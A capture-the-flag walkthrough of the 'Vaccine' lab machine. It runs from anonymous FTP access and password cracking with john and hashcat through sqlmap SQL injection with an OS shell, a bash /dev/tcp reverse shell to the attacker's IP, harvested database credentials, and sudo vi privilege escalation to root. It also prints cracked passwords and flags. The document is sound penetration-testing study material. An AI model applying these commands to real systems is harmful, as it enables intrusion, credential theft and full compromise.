# CTF Walkthrough: Vaccine

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Information Gathering](#2-information-gathering)
- [3. Foothold](#3-foothold)
- [4. Privilege Escalation](#4-privilege-escalation)

---

## 1. Introduction

**Category:** FTP, zip2john, john, hashid, hashcat, Burpsuite, proxy, request, sqlmap, SQL-Injection, Reverse Shell, netcat, SUDO Exploitation, GTFOBins, vi
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Information Gathering

### 2.1. Initial Enumeration
- **Add to /etc/hosts**
    - Command: `sudo vim /etc/hosts`
    - Command: `10.129.95.174 vaccine.htb`

- **Running Services**
    - Command: `nmap -sV -sC 10.129.95.174`
        - Output:
            ```
            PORT   STATE SERVICE VERSION
            21/tcp open  ftp     vsftpd 3.0.3
            | ftp-syst:
            |   STAT:
            | FTP server status:
            |      Connected to ::ffff:10.10.14.174
            |      Logged in as ftpuser
            |      TYPE: ASCII
            |      No session bandwidth limit
            |      Session timeout in seconds is 300
            |      Control connection is plain text
            |      Data connections will be plain text
            |      At session startup, client count was 1
            |      vsFTPd 3.0.3 - secure, fast, stable
            |_End of status
            | ftp-anon: Anonymous FTP login allowed (FTP code 230)
            |_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
            22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
            | ssh-hostkey:
            |   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
            |   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
            |_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
            80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
            | http-cookie-flags:
            |   /:
            |     PHPSESSID:
            |_      httponly flag not set
            |_http-title: MegaCorp Login
            |_http-server-header: Apache/2.4.41 (Ubuntu)
            Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
            ```
    - Command: `ftp 10.129.95.174`
        - Output:
            ```
            Name (10.129.95.174:__): anonymous
            ```
    - Command: `ls`
        - Output:
            ```
            -rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
            ```
    - Command: `get backup.zip`

- **Enumeration**
    - Commnad: `unzip backup.zip`
        - Output:
            ```
            [backup.zip] index.php password:
            ```
        - The backup.zip is password protected

    - Use JohnTheRipper
        - Command: `zip2john backup.zip > hashes`
        - Command: `cat hashes`
            - Output:
                ```
                backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*9
                ...
                94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip
                ```
        - Commnad: `john hashes`
        - Command: `john --show hashes`
            - Output:
                ```
                backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
                ```
            - Password is 741852963
    
    - Command: `unzip backup.zip`
        - Output:
            ```
            inflating: index.php
            inflating: style.css
            ```

    - Command: `grep -i pass index.php`
        - Output:
            ```
            if(isset($_POST['username']) && isset($_POST['password'])) {
                if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
            ```
        - Username: admin
        - Hashed Password: 2cb42f8734ea607eefed3b70af13bbd3

    - Command: `hashid 2cb42f8734ea607eefed3b70af13bbd3`
        - Output:
            ```
            Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
            [+] MD2
            [+] MD5
            [+] MD4
            [+] Double MD5
            [+] LM
            [+] RIPEMD-128
            [+] Haval-128
            [+] Tiger-128
            ...
            ```
        - It is a MD5 hash
    
    - Cracking the Hash
        - Command: `echo 2cb42f8734ea607eefed3b70af13bbd3 > hash`
        - Command: `hashcat -m 0 hash /usr/share/wordlists/rockyou.txt`
        - Commnad: `hashcat -m 0 --show hash`
            - Output:
                ```
                2cb42f8734ea607eefed3b70af13bbd3:qwerty789
                ```
            - Username: admin
            - Password: qwerty789
    
    - Login to http://vaccine.htb

## 3. Foothold
- **Utilize sqlmap for SQL injection**
    - Intercept with Burpsuite
    - Search for random string in search bar
    - Save request to file as "request"
    - sqlmap
        - Command: `sqlmap -r request --os-shell`
            - Output:
                ```
                GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)?
                [y/N]
                [20:33:21] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and
                press ENTER
                os-shell>
                ```

- **Reverse Shell**
    - Start netcat
        - Command: `nc -lvnp 1261`
    - Send payload
        - Command: `bash -c "sh -i >& /dev/tcp/10.10.14.174/1261 0>&1"`
            - Output:
                ```
                listening on [any] 1261 ...
                connect to [10.10.14.174] from (UNKNOWN) [10.129.95.174] 33172
                sh: 0: can't access tty; job control turned off
                $
                ```
    - Interactive Shell:
        - Command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
        - Ctrl + Z 
        - Command: stty raw -echo; fg
        - enter
        - Command: export TERM=xterm-256color

- **User Flag**
    - Command: `cat /var/lib/postgresql/user.txt`
        - Output:
            ```
            ec9b13ca4d6229cd5cc1e09980965bf7
            ```

## 4. Privilege Escalation
- **Check password in /var/www/html**
    - Command: `cd /var/www/html`
    - Command: `grep -i pass *`
        - Output:
            ```
            dashboard.php:    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
            ```
        - Username: postgres
        - Password: P@s5w0rd!

- **Check elevating Privileges**
    - Command: `sudo -l`
        - Output:
            ```
            Matching Defaults entries for postgres on vaccine:
                env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
                XFILESEARCHPATH XUSERFILESEARCHPATH",
                secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
                mail_badpass

            User postgres may run the following commands on vaccine:
                (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
            ```

- **Exploit Privilege**
    - Command: `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
    - Referenced from GTFOBins
        - Command: `:set shell=/bin/sh`
        - Command: `:shell`

- **Root Flag**:
    - Command: `cat /root/root.txt`
        - Output:
            ```
            dd6e058e814260bc70e9bbdef2715849
            ```

